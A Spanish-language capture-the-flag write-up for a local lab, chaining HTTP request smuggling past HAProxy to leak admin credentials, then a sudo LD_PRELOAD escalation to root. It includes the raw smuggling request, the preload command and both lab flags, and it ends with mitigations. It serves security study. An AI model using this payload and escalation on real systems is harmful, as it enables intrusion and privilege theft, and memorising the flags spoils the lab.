# PROXY — WHOAMI-LABS.COM

**Laboratorio:** PROXY (WHOAMI-LABS.COM)
**Categoría:** HTTP request smuggling y escalada mediante `LD_PRELOAD`
**Dificultad:** ★★★★★★★★ insano (8 puntos)
**Fecha:** 2026-10-31
**Estado:** resuelto
**Flag de User:** `proxy{w3lc0m3_t0_th3_fr0nt_l1ne}`
**Flag de Root:** `root{smuggl1ng_4nd_pr3l04d1ng_ftw}`

## Alcance y preparación local

- Alcance autorizado: imagen local `proxy.tar` del laboratorio PROXY.
- El contenedor se inició en la red Docker local con IP `172.17.0.2`.
- Servicios observados: HAProxy en `80/tcp`, SSH en `22/tcp`, FTP en `21/tcp`,
  MySQL en `3306/tcp` y una consola honeypot en `8080/tcp`.
- Herramientas: Docker, sockets TCP, `curl`, `gcc` y `sudo`.

## Resumen

La cadena tiene dos etapas:

1. HAProxy bloquea `/api/internal` mirando la ruta de la petición, pero elimina el
   header `Transfer-Encoding` antes de reenviar al backend. El backend artesanal
   interpreta el cuerpo usando `Content-Length`. La diferencia de parsers permite
   desincronizar la conexión y hacer que el backend procese una segunda petición
   hacia `/api/internal/backup_keys`.
2. El endpoint interno devuelve material de acceso para `sys-admin`. Esa cuenta
   puede ejecutar `/usr/bin/firewall-tester` con `sudo` sin contraseña y el entorno
   mantiene `LD_PRELOAD`. Una biblioteca compartida cargada por el binario ejecuta
   código con privilegios de root y permite leer `/root/root.txt`.

## Etapa 1: HTTP request smuggling

1. El portal público mostraba un enlace a `/api/internal/backup_keys`, pero una
   petición directa era rechazada por HAProxy:

   ```text
   HTTP/1.0 403 Forbidden
   Request forbidden by administrative rules.
   ```

2. La configuración de HAProxy contenía:

   ```text
   acl is_internal path_beg /api/internal
   http-request deny if is_internal
   http-request del-header Transfer-Encoding
   server backend1 127.0.0.1:5000
   ```

3. El backend usa `Content-Length` para separar el cuerpo, mientras HAProxy acepta
   una petición con `Transfer-Encoding: chunked`. Se envió una petición externa
   `POST /` con un `Content-Length` que sólo cubría el encabezado del chunk y un
   chunk que contenía la petición interna:

   ```http
   POST / HTTP/1.1
   Host: [REDACTED]
   Content-Length: 3
   Transfer-Encoding: chunked
   Connection: keep-alive

   46
   GET /api/internal/backup_keys HTTP/1.1
   Host: [REDACTED]
   Connection: keep-alive

   0
   ```

   El valor exacto del tamaño del chunk se calculó según la longitud de la
   petición interna. Para que la respuesta interna se entregara al cliente fue
   necesario enviar una petición HTTP posterior en la misma conexión.

4. La respuesta obtenida del backend fue:

   ```json
   {
     "status": "success",
     "message": "Internal keys accessed successfully.",
     "data": {
       "sys-admin_ssh_key": "[REDACTED]",
       "sys-admin_password": "[REDACTED]",
       "note": "Use these credentials to SSH into the box."
     }
   }
   ```

   Las credenciales y la clave privada no se publican.

## Etapa 2: escalada local con `LD_PRELOAD`

1. La cuenta recuperada `sys-admin` tenía esta autorización:

   ```text
   sys-admin ALL=(ALL) NOPASSWD: /usr/bin/firewall-tester
   Defaults env_keep += "LD_PRELOAD"
   ```

2. Se creó una biblioteca compartida en `/tmp` con un constructor que abre
   `/root/root.txt` y copia su contenido a un archivo temporal controlado. La
   biblioteca también reemplazó `sleep()` para que la prueba terminara sin
   esperar.

3. La ejecución privilegiada se realizó con la asignación de entorno aceptada por
   `sudo`:

   ```bash
   sudo -n LD_PRELOAD=/tmp/rootshell.so /usr/bin/firewall-tester
   ```

4. El contenido recuperado de `/root/root.txt` fue:

   ```text
   root{smuggl1ng_4nd_pr3l04d1ng_ftw}
   ```

## Esperado frente a observado

| Caso | Esperado | Observado |
| --- | --- | --- |
| `/api/internal/backup_keys` por ruta normal | `403 Forbidden` | Bloqueado por HAProxy |
| Parsers de proxy y backend | Misma interpretación del cuerpo | Interpretaciones distintas de `Transfer-Encoding` y `Content-Length` |
| Endpoint interno | Sólo accesible por VPN | Alcanzable mediante desync |
| `sys-admin` | Sin ejecución root arbitraria | `sudo` permitió `firewall-tester` y conservó `LD_PRELOAD` |
| `/root/root.txt` | Sólo root | Leído mediante biblioteca cargada por el binario privilegiado |

## Evidencia

- `evidence/proxy/01-baseline-and-routing.txt` — bloqueo externo y configuración
  relevante de HAProxy.
- `evidence/proxy/02-smuggling-response.txt` — respuesta del endpoint interno,
  con credenciales y clave privada redactadas.
- `evidence/proxy/03-sudo-policy.txt` — autorización de `sys-admin` y binario
  permitido.
- `evidence/proxy/04-validation.txt` — aceptación oficial de ambas flags.

## Análisis

La vulnerabilidad HTTP aparece porque el proxy y el backend no comparten una
política única para delimitar solicitudes. Eliminar `Transfer-Encoding` después de
aceptar una petición chunked deja al backend con una representación ambigua del
flujo. La escalada posterior no depende de la clave privada: la combinación de
`NOPASSWD`, un binario ejecutable por el usuario y `LD_PRELOAD` preservado permite
cargar código controlado por `sys-admin` como root.

- **Caja negra:** se observó el `403`, la respuesta interna smuggled y la salida
  del binario diagnóstico.
- **Inspección local del laboratorio:** se revisaron las configuraciones y el
  código de los backends para explicar el comportamiento. No se publican secretos
  operativos.

## Validación de flags

El validador oficial respondió:

```text
[+] Flag de usuario correcta. ¡Buen trabajo!
¡Felicitaciones! Has comprometido PROXY a nivel Insano.
TIEMPO TOTAL: 00h 00m 00s
```

## Mitigaciones

1. Normalizar y validar el framing HTTP en un único componente; rechazar requests
   ambiguas con `Content-Length` y `Transfer-Encoding` simultáneos.
2. No eliminar headers de framing antes de reenviar una petición sin reconstruir
   correctamente el cuerpo y sus límites.
3. No devolver claves privadas ni contraseñas desde endpoints internos; exigir
   autenticación fuerte, autorización y segmentación de red.
4. Evitar `LD_PRELOAD` en el entorno de comandos privilegiados y no conservarlo
   mediante `sudo`; aplicar allowlists estrictas y binarios sin superficies de
   carga controlables.
